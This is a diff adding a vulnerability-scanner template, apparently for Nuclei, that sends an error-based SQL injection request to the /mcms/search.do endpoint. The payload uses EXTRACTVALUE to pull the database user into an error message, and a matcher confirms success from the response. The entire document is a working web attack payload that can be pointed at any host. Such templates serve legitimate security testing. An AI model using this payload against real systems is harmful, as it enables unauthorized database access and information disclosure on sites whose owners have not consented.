@@ -1,0 +1,24 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"12321","springframework")
